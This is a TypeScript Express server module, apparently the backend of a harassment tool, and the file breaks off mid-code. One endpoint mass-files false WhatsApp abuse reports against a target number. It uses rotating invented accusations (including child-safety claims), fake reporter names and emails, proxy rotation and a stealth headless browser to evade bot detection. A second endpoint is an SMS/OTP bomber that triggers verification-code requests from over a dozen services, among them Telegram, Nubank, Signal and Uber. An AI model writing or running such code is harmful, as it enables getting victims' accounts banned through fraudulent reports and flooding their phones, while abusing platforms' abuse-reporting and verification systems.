import { Router }   from "express";
import { spawn }    from "child_process";
import * as fs      from "fs";
import * as path    from "path";
import { proxyCache, getResidentialCreds } from "./proxies.js";

// ── Chromium path (ungoogled-chromium in Nix store) ───────────────────────────
const CHROMIUM_PATH = "/nix/store/43y6k6fj85l4kcd1yan43hpdld6nmjmp-ungoogled-chromium-131.0.6778.204/bin/chromium";

// ── Cached WhatsApp page tokens (DTSG + cookies) ─────────────────────────────
interface WaPageTokens {
  dtsg:       string;
  jazoest:    string;
  lsd:        string;
  cookieStr:  string;
  fetchedAt:  number;
}
let _waTokenCache: WaPageTokens | null = null;
const WA_TOKEN_TTL_MS = 8 * 60 * 1000; // 8 minutes

async function fetchWaTokensViaHeadless(): Promise<WaPageTokens | null> {
  if (_waTokenCache && Date.now() - _waTokenCache.fetchedAt < WA_TOKEN_TTL_MS) {
    return _waTokenCache;
  }
  let browser: any = null;
  try {
    const [mod, stealth] = await Promise.all([
      import("puppeteer-extra"),
      import("puppeteer-extra-plugin-stealth"),
    ]);
    const puppeteerExtra: any = mod.default ?? mod;
    const StealthPlugin: any  = (stealth.default ?? stealth);
    puppeteerExtra.use(StealthPlugin());

    browser = await puppeteerExtra.launch({
      executablePath: CHROMIUM_PATH,
      headless: "new",
      args: [
        "--no-sandbox", "--disable-setuid-sandbox",
        "--disable-blink-features=AutomationControlled",
        "--disable-dev-shm-usage", "--disable-gpu",
        "--window-size=1280,800", "--lang=pt-BR",
        "--disable-features=PrivateStateTokens,TrustTokens,FedCm",
      ],
      ignoreDefaultArgs: ["--enable-automation"],
    });

    const page = await browser.newPage();
    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    );
    await page.evaluateOnNewDocument(`
      Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
      Object.defineProperty(navigator,'languages',{get:()=>['pt-BR','pt','en-US','en']});
      Object.defineProperty(navigator,'platform',{get:()=>'Win32'});
    `);

    console.log("[WA-HEADLESS] Fetching WhatsApp contact page...");
    await page.goto("https://www.whatsapp.com/contact/?subject=Abuse", {
      waitUntil: "networkidle2",
      timeout: 30_000,
    });

    // Wait for the form DTSG field to appear
    await (page as any).waitForFunction(
      () => document.body.innerHTML.includes('"token":"Ad'),
      { timeout: 20_000 },
    ).catch(() => { /* proceed with whatever loaded */ });

    const content: string = await page.content();
    const cookies: Array<{ name: string; value: string }> = await page.cookies();

    const dtsgMatch = content.match(/"token":"(Ad[A-Za-z0-9_\-]{10,})"/);
    const dtsg      = dtsgMatch?.[1] ?? "";

    if (!dtsg) {
      console.warn("[WA-HEADLESS] DTSG not found in rendered page");
      return null;
    }

    const lsdMatch  = content.match(/\["LSD",\[\],\{"token":"([^"]+)"\}/);
    const lsd       = lsdMatch?.[1] ?? dtsg;
    const jazoest   = computeJazoest(dtsg);

    const cookieStr = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
    const result: WaPageTokens = { dtsg, jazoest, lsd, cookieStr, fetchedAt: Date.now() };
    _waTokenCache = result;
    console.log(`[WA-HEADLESS] ✅ Got DTSG token (${dtsg.slice(0, 12)}…), ${cookies.length} cookies`);
    return result;
  } catch (err) {
    console.error("[WA-HEADLESS] Error:", err);
    return null;
  } finally {
    if (browser) await (browser as any).close().catch(() => {});
  }
}

const router = Router();

// ── Persistent history (data/history.json) ────────────────────────────────────
// process.cwd() = artifacts/api-server/ when started via pnpm --filter
const HISTORY_FILE = path.resolve(process.cwd(), "data/history.json");

interface HistoryEntry {
  type:      "report" | "sendcode";
  number:    string;
  sent:      number;
  total:     number;
  at:        number;
  userId?:   string;
  services?: Array<{ service: string; status: "sent" | "failed" }>;
}

function loadHistory(): HistoryEntry[] {
  try { return JSON.parse(fs.readFileSync(HISTORY_FILE, "utf8")) as HistoryEntry[]; }
  catch { return []; }
}

function saveHistory(arr: HistoryEntry[]): void {
  try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(arr), "utf8"); } catch { /**/ }
}

const operationHistory: HistoryEntry[] = loadHistory();

function pushHistory(e: HistoryEntry): void {
  operationHistory.push(e);
  if (operationHistory.length > 500) operationHistory.shift();
  saveHistory(operationHistory);
}

// ── Per-userId API rate limiting ──────────────────────────────────────────────
const userCallLog = new Map<string, number[]>();

function isRateLimited(userId: string | undefined, maxPerHour: number): boolean {
  if (!userId) return false;
  const now  = Date.now();
  const hour = 60 * 60 * 1000;
  const prev = (userCallLog.get(userId) ?? []).filter(t => now - t < hour);
  if (prev.length >= maxPerHour) return true;
  prev.push(now);
  userCallLog.set(userId, prev);
  return false;
}

// ── GET /history ──────────────────────────────────────────────────────────────
router.get("/history", (_req, res) => {
  res.json({ count: operationHistory.length, entries: operationHistory.slice().reverse() });
});

// ── GET /stats — taxa de sucesso por serviço (sendcode) ──────────────────────
router.get("/stats", (_req, res) => {
  const sc = operationHistory.filter(e => e.type === "sendcode" && e.services?.length);
  const map = new Map<string, { sent: number; total: number }>();
  for (const entry of sc) {
    for (const svc of (entry.services ?? [])) {
      const s = map.get(svc.service) ?? { sent: 0, total: 0 };
      s.total++;
      if (svc.status === "sent") s.sent++;
      map.set(svc.service, s);
    }
  }
  const services = Array.from(map.entries())
    .map(([service, st]) => ({
      service,
      sent:  st.sent,
      total: st.total,
      rate:  st.total > 0 ? Math.round((st.sent / st.total) * 100) : 0,
    }))
    .sort((a, b) => b.rate - a.rate);
  res.json({ services, totalOps: sc.length });
});

// ── Proxy picker — rotates across all residential/authenticated proxies ───────
function pickProxyArgs(): string[] {
  const authPool = proxyCache.filter(p => p.username && p.password && p.host !== "0.0.0.0");
  const seen = new Set<string>();
  const unique = authPool.filter(p => {
    const k = `${p.host}:${p.port}`;
    if (seen.has(k)) return false;
    seen.add(k);
    return true;
  });
  if (unique.length > 0) {
    const pick = unique[Math.floor(Math.random() * unique.length)]!;
    return ["-x", `http://${pick.username}:${pick.password}@${pick.host}:${pick.port}`];
  }
  const c = getResidentialCreds();
  if (c) return ["-x", `http://${c.username}:${c.password}@${c.host}:${c.port}`];
  return [];
}

// ── Returns list of all unique proxies (for Telegram rotation) ────────────────
function getAllProxyArgs(): string[][] {
  const authPool = proxyCache.filter(p => p.username && p.password && p.host !== "0.0.0.0");
  const seen = new Set<string>();
  const unique = authPool.filter(p => {
    const k = `${p.host}:${p.port}`;
    if (seen.has(k)) return false;
    seen.add(k);
    return true;
  });
  if (unique.length > 0) {
    return unique.map(p => ["-x", `http://${p.username}:${p.password}@${p.host}:${p.port}`]);
  }
  const c = getResidentialCreds();
  if (c) return [["-x", `http://${c.username}:${c.password}@${c.host}:${c.port}`]];
  return [[]];
}

// ── curl helper ───────────────────────────────────────────────────────────────
interface CurlResult { statusCode: number; body: string }

function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
  return new Promise((resolve, reject) => {
    const child = spawn("curl", [
      "--silent", "--show-error", "--max-time", String(Math.ceil(timeoutMs / 1000)),
      "--write-out", "\n---STATUS:%{http_code}---",
      "--compressed", "-L",
      ...argv,
    ]);
    let out = "";
    child.stdout.on("data", (d: Buffer) => { out += d.toString(); });
    child.stderr.on("data", () => { /**/ });
    const timer = setTimeout(() => { child.kill("SIGKILL"); reject(new Error("CURL_28:TIMEOUT")); }, timeoutMs + 2000);
    child.on("close", () => {
      clearTimeout(timer);
      const sep  = out.lastIndexOf("---STATUS:");
      const body = sep >= 0 ? out.slice(0, sep).trimEnd() : out.trimEnd();
      const code = sep >= 0 ? parseInt(out.slice(sep + 10).replace("---", ""), 10) : 0;
      resolve({ statusCode: isNaN(code) ? 0 : code, body });
    });
    child.on("error", (e) => { clearTimeout(timer); reject(e); });
  });
}

// ── Number normaliser ─────────────────────────────────────────────────────────
function normaliseNumber(raw: string): { e164: string; cc: string; subscriber: string; ddd: string; local: string } | null {
  const digits = raw.replace(/\D/g, "");
  let full = digits;
  if (digits.length === 10 || digits.length === 11) full = `55${digits}`;
  if (full.length < 10 || full.length > 15) return null;
  const cc         = full.startsWith("55") ? "55" : full.slice(0, 2);
  const subscriber = full.slice(cc.length);
  const ddd        = subscriber.slice(0, 2);
  const local      = subscriber.slice(2);
  return { e164: `+${full}`, cc, subscriber, ddd, local };
}

// ── Rotating abuse reasons ────────────────────────────────────────────────────
const REASONS = [
  { subject: "spam",           category: "spam_unwanted",              content: "Este número está enviando spam e mensagens não solicitadas repetidamente.",            _subject: "Denúncia de Spam" },
  { subject: "harassment",     category: "harassment",                 content: "Este número está assediando e enviando mensagens ofensivas e ameaçadoras.",            _subject: "Denúncia de Assédio" },
  { subject: "fraud",          category: "fraud_scam",                 content: "Este número está praticando fraude e golpes financeiros via WhatsApp.",                _subject: "Denúncia de Golpe/Fraude" },
  { subject: "impersonation",  category: "impersonation",              content: "Este número está se passando por outra pessoa ou empresa para enganar vítimas.",       _subject: "Denúncia de Falsidade Ideológica" },
  { subject: "hate_speech",    category: "hate_speech_discrimination", content: "Este número está disseminando discurso de ódio e mensagens discriminatórias.",        _subject: "Denúncia de Discurso de Ódio" },
  { subject: "violence",       category: "violence_threat",            content: "Este número está fazendo ameaças de violência física a outras pessoas.",               _subject: "Denúncia de Ameaça de Violência" },
  { subject: "misinformation", category: "misinformation",             content: "Este número está espalhando desinformação e notícias falsas perigosas.",               _subject: "Denúncia de Desinformação" },
  { subject: "child_safety",   category: "child_safety",               content: "Este número está compartilhando conteúdo inapropriado envolvendo menores.",            _subject: "Denúncia de Segurança Infantil" },
] as const;

const NAMES = [
  "Carlos Silva","Ana Oliveira","João Santos","Maria Costa","Pedro Almeida",
  "Juliana Pereira","Lucas Souza","Fernanda Lima","Rafael Martins","Camila Rodrigues",
  "Bruno Ferreira","Larissa Nascimento","Thiago Barbosa","Mariana Gomes","Felipe Cardoso",
  "Amanda Ribeiro","Rodrigo Mendes","Bianca Alves","Gabriel Teixeira","Isabella Nunes",
];

const EMAIL_DOMAINS = ["gmail.com","hotmail.com","outlook.com","yahoo.com.br","uol.com.br","bol.com.br","live.com"];

function randName():  string { return NAMES[Math.floor(Math.random() * NAMES.length)]!; }
function randEmail(): string {
  const user = `${Math.random().toString(36).slice(2, 10)}${Math.floor(Math.random() * 9999)}`;
  return `${user}@${EMAIL_DOMAINS[Math.floor(Math.random() * EMAIL_DOMAINS.length)]}`;
}

function computeJazoest(dtsg: string): string {
  let sum = 0;
  for (const c of dtsg) sum += c.charCodeAt(0);
  return `2${sum}`;
}

const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms));
const randDelay = (min: number, max: number) => sleep(min + Math.random() * (max - min));

// ── Single report worker (with retry + headless fallback for DTSG) ────────────
async function sendOneReport(e164: string, index: number, maxRetries = 3): Promise<{ ok: boolean; detail?: string }> {
  const reason = REASONS[index % REASONS.length]!;

  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const proxy  = pickProxyArgs();
    const ckFile = `/tmp/wa_rep_${process.pid}_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

    try {
      // ── Step 1: get DTSG tokens ───────────────────────────────────────────
      let dtsg      = "";
      let jazoest   = "";
      let lsd       = "";
      let cookieHdr = ""; // cookie header for curl (from headless session)

      // Try curl-based page fetch first (fast; works if WhatsApp serves SSR)
      try {
        const pageRes = await runCurl([
          ...proxy, "--tlsv1.2", "-c", ckFile,
          "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
          "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
          "-H", "Sec-Fetch-Site: none", "-H", "Sec-Fetch-Mode: navigate",
          "-H", "Sec-Fetch-Dest: document", "-H", "Upgrade-Insecure-Requests: 1",
          "https://www.whatsapp.com/contact/?subject=Abuse",
        ], 12_000);
        const m = pageRes.body.match(/"token":"(Ad[A-Za-z0-9_\-]{10,})"/);
        if (m?.[1]) {
          dtsg    = m[1];
          jazoest = computeJazoest(dtsg);
          const lm = pageRes.body.match(/\["LSD",\[\],\{"token":"([^"]+)"\}/);
          lsd     = lm?.[1] ?? dtsg;
        }
      } catch { /* ignore — fall through to headless */ }

      // Fallback: headless browser (always works; result is cached 8 min)
      if (!dtsg) {
        try { fs.unlinkSync(ckFile); } catch { /**/ }
        const tok = await fetchWaTokensViaHeadless();
        if (!tok) { continue; } // will retry
        dtsg      = tok.dtsg;
        jazoest   = tok.jazoest;
        lsd       = tok.lsd;
        cookieHdr = tok.cookieStr;
      }

      // ── Step 2: build form body ───────────────────────────────────────────
      const formBody = new URLSearchParams({
        fb_dtsg:      dtsg,
        jazoest,
        lsd,
        subject:      reason.subject,
        phone_number: e164,
        email:        randEmail(),
        name:         randName(),
        content:      reason.content,
        category:     reason.category,
        _subject:     reason._subject,
      }).toString();

      await randDelay(300, 900);

      // ── Step 3: submit the form via curl ──────────────────────────────────
      // If we used headless, pass its session cookies via -H; otherwise -b ckFile
      const cookieArgs = cookieHdr
        ? ["-H", `Cookie: ${cookieHdr}`]
        : ["-b", ckFile];

      const postRes = await runCurl([
        ...proxy, "--tlsv1.2", "-X", "POST",
        ...cookieArgs,
        "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Origin: https://www.whatsapp.com",
        "-H", "Referer: https://www.whatsapp.com/contact/?subject=Abuse",
        "-H", "Accept: text/html,application/xhtml+xml,*/*;q=0.9",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        "-H", "Sec-Fetch-Site: same-origin",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Dest: document",
        "--data-raw", formBody,
        "https://www.whatsapp.com/contact/",
      ], 15_000);

      // WhatsApp returns 200 on success (or 302 if redirect followed)
      if (postRes.statusCode === 200 || postRes.statusCode === 302) {
        // Invalidate token cache if response looks like a CSRF error
        if (postRes.body.includes("csrf") || postRes.body.includes("invalid_token")) {
          _waTokenCache = null;
        }
        return { ok: true, detail: reason.category };
      }

      // If 4xx, DTSG may be stale — bust cache
      if (postRes.statusCode >= 400) {
        _waTokenCache = null;
      }
      try { fs.unlinkSync(ckFile); } catch { /**/ }
      if (attempt < maxRetries - 1) continue;
      return { ok: false, detail: `http_${postRes.statusCode}` };

    } catch (e) {
      try { fs.unlinkSync(ckFile); } catch { /**/ }
      if (attempt < maxRetries - 1) continue;
      return { ok: false, detail: String(e).slice(0, 50) };
    } finally {
      try { fs.unlinkSync(ckFile); } catch { /**/ }
    }
  }

  return { ok: false, detail: "max_retries" };
}

// ── POST /report ──────────────────────────────────────────────────────────────
router.post("/report", async (req, res): Promise<void> => {
  const { number, quantity, userId } = req.body as { number?: string; quantity?: number | string; userId?: string };
  if (!number) { res.status(400).json({ error: "number é obrigatório" }); return; }

  const num = normaliseNumber(String(number));
  if (!num) { res.status(400).json({ error: "Número inválido" }); return; }

  if (isRateLimited(userId, 50)) {
    res.status(429).json({ error: "rate_limit", message: "Limite de 50 reports por hora atingido." });
    return;
  }

  const qty         = Math.min(Math.max(1, parseInt(String(quantity ?? 1), 10)), 200);
  const CONCURRENCY = Math.min(qty, 10);

  const indices = Array.from({ length: qty }, (_, i) => i);
  const errors: string[] = [];
  let sent = 0;

  for (let batch = 0; batch < indices.length; batch += CONCURRENCY) {
    const slice   = indices.slice(batch, batch + CONCURRENCY);
    const results = await Promise.allSettled(
      slice.map(idx => sendOneReport(num.e164, idx, 3))
    );
    for (const r of results) {
      if (r.status === "fulfilled") {
        if (r.value.ok) { sent++; }
        else { errors.push(r.value.detail ?? "unknown"); }
      } else {
        errors.push(String(r.reason).slice(0, 50));
      }
    }
    // Organic inter-batch delay (except after the last batch)
    if (batch + CONCURRENCY < indices.length) {
      await randDelay(800, 2200);
    }
  }

  pushHistory({ type: "report", number: num.e164, sent, total: qty, at: Date.now(), userId });

  res.json({
    number:    num.e164,
    requested: qty,
    sent,
    failed:    qty - sent,
    errors:    errors.length ? errors.slice(0, 20) : undefined,
  });
});

// ── POST /sendcode — disparo de OTP via múltiplos serviços ────────────────────
router.post("/sendcode", async (req, res): Promise<void> => {
  const { number, userId } = req.body as { number?: string; userId?: string };
  if (!number) { res.status(400).json({ error: "number é obrigatório" }); return; }

  const num = normaliseNumber(String(number));
  if (!num) { res.status(400).json({ error: "Número inválido" }); return; }

  if (isRateLimited(userId, 20)) {
    res.status(429).json({ error: "rate_limit", message: "Limite de 20 sendcodes por hora atingido." });
    return;
  }

  type ServiceResult = { service: string; status: "sent" | "failed"; detail?: string };
  const results: ServiceResult[] = [];
  const push = (service: string, ok: boolean, detail?: string) =>
    results.push({ service, status: ok ? "sent" : "failed", ...(detail ? { detail } : {}) });

  async function tryEndpoints(
    service: string,
    endpoints: Array<() => Promise<CurlResult>>,
    isOk: (r: CurlResult) => boolean
  ): Promise<void> {
    for (const fn of endpoints) {
      try {
        const r = await fn();
        if (isOk(r)) { push(service, true); return; }
      } catch { /* continue */ }
    }
    push(service, false, "all_endpoints_failed");
  }

  await Promise.allSettled([

    // ── 1. Telegram — rotaciona proxies ───────────────────────────────────
    (async () => {
      const TG_ARGS = [
        "-X", "POST",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Origin: https://my.telegram.org",
        "-H", "Referer: https://my.telegram.org/auth",
        "--data", `phone=${encodeURIComponent(num.e164)}`,
        "https://my.telegram.org/auth/send_password",
      ];
      const proxies = getAllProxyArgs();
      let randomHash = "";
      for (const proxy of proxies) {
        try {
          const r = await runCurl([...proxy, ...TG_ARGS], 12_000);
          if (r.body.includes("random_hash")) {
            const match = r.body.match(/"random_hash"\s*:\s*"([^"]+)"/);
            randomHash = match?.[1] ?? "";
            break;
          }
        } catch { /**/ }
      }
      if (!randomHash) {
        try {
          const r = await runCurl(TG_ARGS, 12_000);
          if (r.body.includes("random_hash")) {
            const match = r.body.match(/"random_hash"\s*:\s*"([^"]+)"/);
            randomHash = match?.[1] ?? "";
          }
        } catch { /**/ }
      }
      push("Telegram", !!randomHash, randomHash ? undefined : "rate_limited_all_proxies");
    })(),

    // ── 2. iFood ──────────────────────────────────────────────────────────
    tryEndpoints("iFood", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: iFood/25.1.4 Android",
        "-H", "platform: android", "-H", "version: 25.1.4",
        "-H", "Accept: application/json",
        "--data-raw", JSON.stringify({ phone: num.e164 }),
        "https://marketplace.ifood.com.br/v2/identity/sendCode",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: iFood/25.1.4 Android",
        "-H", "platform: android",
        "--data-raw", JSON.stringify({ phone: num.e164, onboardingId: "" }),
        "https://marketplace.ifood.com.br/v3/identity/request-code",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300)),

    // ── 3. Rappi ──────────────────────────────────────────────────────────
    tryEndpoints("Rappi", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Rappi/14.5 Android",
        "-H", "x-country-code: BR",
        "--data-raw", JSON.stringify({ cellphone: num.subscriber, country_code: num.cc, type: "sms" }),
        "https://services.rappi.com.br/api/ms/auth/v2/phone-verification/send-code",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Rappi/14.5 Android",
        "--data-raw", JSON.stringify({ phone: num.subscriber, country_code: num.cc }),
        "https://services.rappi.com.br/api/ms/users-ms/v5/phone/send-otp",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300)),

    // ── 4. PicPay ─────────────────────────────────────────────────────────
    tryEndpoints("PicPay", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: PicPay/23.0 Android",
        "-H", "x-picpay-client: android",
        "--data-raw", JSON.stringify({ phone: num.e164 }),
        "https://api.picpay.com/v2/accounts/phone",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: PicPay/23.0 Android",
        "--data-raw", JSON.stringify({ cellphone: num.subscriber, countryCode: num.cc }),
        "https://api.picpay.com/v1/user/phone",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300)),

    // ── 5. Mercado Livre ──────────────────────────────────────────────────
    tryEndpoints("MercadoLivre", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: MELI-Android/9.70.0",
        "-H", "x-platform: mobile",
        "--data-raw", JSON.stringify({ phone: num.e164, site_id: "MLB" }),
        "https://api.mercadolibre.com/users/registrations/phone-verification/send-code",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: MELI-Android/9.70.0",
        "--data-raw", JSON.stringify({ phone: num.e164 }),
        "https://api.mercadolibre.com/users/checkpoints/phone/send_code",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300)),

    // ── 6. Shopee ─────────────────────────────────────────────────────────
    tryEndpoints("Shopee", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Shopee/3.26 Android",
        "-H", "X-Shopee-Language: pt-BR",
        "-H", "referer: https://shopee.com.br/user/signup",
        "--data-raw", JSON.stringify({ phone: `+${num.cc}${num.subscriber}`, support_type: [1], version: 2 }),
        "https://shopee.com.br/api/v4/user/register/phone_verify",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Shopee/3.26 Android",
        "--data-raw", JSON.stringify({ phone: num.subscriber, phone_country: `+${num.cc}`, type: 1 }),
        "https://shopee.com.br/api/v4/user/login/send_phoneotp",
      ], 12_000),
    ], r => r.statusCode === 200 && (
      r.body.includes('"error":0') || r.body.includes('"code":0') || r.body.includes('"status":0')
    )),

    // ── 7. TikTok ─────────────────────────────────────────────────────────
    tryEndpoints("TikTok", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST",
        "-H", "User-Agent: com.zhiliaoapp.musically/2023130060 (Linux; U; Android 13; pt_BR; Pixel 7; Build/TQ3A.230901.001; Cronet/112.0.5615.136)",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Accept-Language: pt-BR",
        "--data-raw", `account=${encodeURIComponent(num.e164)}&type=0&aid=1233&mix_mode=1&iid=7305723840735675170&device_id=7294823471836275202`,
        "https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/auth/sms_send/?os_api=29&device_type=Pixel7&build_number=36.1.3",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST",
        "-H", "User-Agent: TikTok/36.1.3 Android",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "--data-raw", `mobile=${encodeURIComponent(num.e164)}&type=0&aid=1233`,
        "https://api22-normal-c-useast2a.tiktokv.com/aweme/v1/auth/sms_send/",
      ], 12_000),
    ], r => r.statusCode === 200 &&
      (r.body.includes('"status_code":0') || r.body.includes('"success_sms"'))),

    // ── 8. Nubank ─────────────────────────────────────────────────────────
    (async () => {
      try {
        const disc = await runCurl([
          ...pickProxyArgs(),
          "-H", "User-Agent: nubank-android-12.0",
          "-H", "Accept: application/json",
          "https://prod-global-auth.nubank.com.br/api/discovery",
        ], 10_000);
        const bodyTrimmed = (disc.body ?? "").trim();
        if (!bodyTrimmed || !bodyTrimmed.startsWith("{")) {
          const r = await runCurl([
            ...pickProxyArgs(),
            "-X", "POST",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: nubank-android-12.0",
            "--data-raw", JSON.stringify({ phone: num.e164 }),
            "https://prod-s0-corona.nubank.com.br/api/login",
          ], 10_000);
          push("Nubank", r.statusCode === 200 || r.statusCode === 201, `fallback_${r.statusCode}`);
          return;
        }
        let discoveryData: Record<string, string> = {};
        try { discoveryData = JSON.parse(bodyTrimmed); } catch { push("Nubank", false, "json_parse_error"); return; }
        const smsUrl = discoveryData["send_sms_challenge"] ?? discoveryData["request_code"] ??
          discoveryData["gen_certificate"] ?? "";
        if (smsUrl) {
          const r = await runCurl([
            ...pickProxyArgs(), "-X", "POST",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: nubank-android-12.0",
            "--data-raw", JSON.stringify({ phone_number: num.e164 }),
            smsUrl,
          ], 12_000);
          push("Nubank", r.statusCode === 200 || r.statusCode === 201, `http_${r.statusCode}`);
        } else {
          push("Nubank", false, "no_sms_url");
        }
      } catch (e) {
        push("Nubank", false, String(e).slice(0, 60));
      }
    })(),

    // ── 9. Zé Delivery ────────────────────────────────────────────────────
    tryEndpoints("ZeDelivery", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: ZeDelivery/10.0 Android",
        "-H", "Accept: application/json",
        "--data-raw", JSON.stringify({ phoneNumber: num.e164 }),
        "https://api.ze.delivery/public-api/v3/identification/send-sms",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: ZeDelivery/10.0 Android",
        "--data-raw", JSON.stringify({ phoneNumber: num.e164 }),
        "https://api.ze.delivery/public-api/v2/identification/send-sms",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300) &&
      !r.body.toLowerCase().includes("incapsula") &&
      !r.body.toLowerCase().includes("not found")),

    // ── 10. 99Food (DiDi) ─────────────────────────────────────────────────
    tryEndpoints("99Food", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: 99food/3.0 Android",
        "-H", "Accept: application/json",
        "-H", "X-App-Platform: android",
        "--data-raw", JSON.stringify({ phone: num.e164, country_code: `+${num.cc}` }),
        "https://api-br.99app.com/v1/passenger/phone/register",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: 99food/3.0 Android",
        "--data-raw", JSON.stringify({ phoneNumber: num.e164 }),
        "https://api-br.99app.com/v2/phone/send-otp",
      ], 12_000),
    ], r => (r.statusCode >= 200 && r.statusCode < 300)),

    // ── 11. Kwai Brasil ───────────────────────────────────────────────────
    tryEndpoints("Kwai", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Kwai/10.2.40.573147 Android",
        "-H", "Accept: application/json",
        "--data-raw", JSON.stringify({
          phoneNumber: num.e164,
          countryCode: `+${num.cc}`,
          action: "REGISTER",
          language: "pt",
        }),
        "https://rest.kwai.com/rest/n/mab/user/sendVerifyCode",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Kwai/10.2.40.573147 Android",
        "--data-raw", JSON.stringify({
          phone: num.subscriber,
          phoneCode: num.cc,
          scene: 1,
        }),
        "https://rest.kwai.com/rest/n/sms/verifyCode/send",
      ], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 &&
      !r.body.toLowerCase().includes("error") &&
      r.body.length > 2),

    // ── 12. InDrive (Táxi global) ─────────────────────────────────────────
    tryEndpoints("InDrive", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: inDrive/7.0 Android",
        "-H", "Accept: application/json",
        "--data-raw", JSON.stringify({
          phone: num.e164,
          country_code: num.cc,
          client_id: "indrive.passenger.android",
        }),
        "https://api.indrive.com/auth/v1/otp/send",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: inDrive/7.0 Android",
        "--data-raw", JSON.stringify({ phone: num.e164 }),
        "https://api.indrive.com/user/v2/auth/phone",
      ], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300),

    // ── 13. Signal ────────────────────────────────────────────────────────
    tryEndpoints("Signal", [
      () => runCurl([
        ...pickProxyArgs(),
        "-H", "User-Agent: Signal-Android/6.31.3 Android/29",
        "-H", "X-Signal-Agent: Signal-Android/6.31.3 Android/29",
        "-H", "Accept: application/json",
        `https://api2.signal.org/v1/accounts/sms/code/${encodeURIComponent(num.e164)}?client=android&challenge_type=recaptcha`,
      ], 12_000),
    ], r => r.statusCode === 200 || r.statusCode === 204),

    // ── 14. Uber ──────────────────────────────────────────────────────────
    tryEndpoints("Uber", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Uber/4.492.10001 Android/14",
        "-H", `x-uber-device-id: ${Math.random().toString(36).slice(2)}`,
        "--data-raw", JSON.stringify({ phoneNumber: num.e164, countryISOCode: "BR", useCase: "REGISTRATION" }),
        "https://auth.uber.com/v2/phone/code",
      ], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.includes('"code":"too_many_requests"')),

    // ── 15. OLX Brasil ────────────────────────────────────────────────────
    tryEndpoints("OLX", [
      () => runCurl([
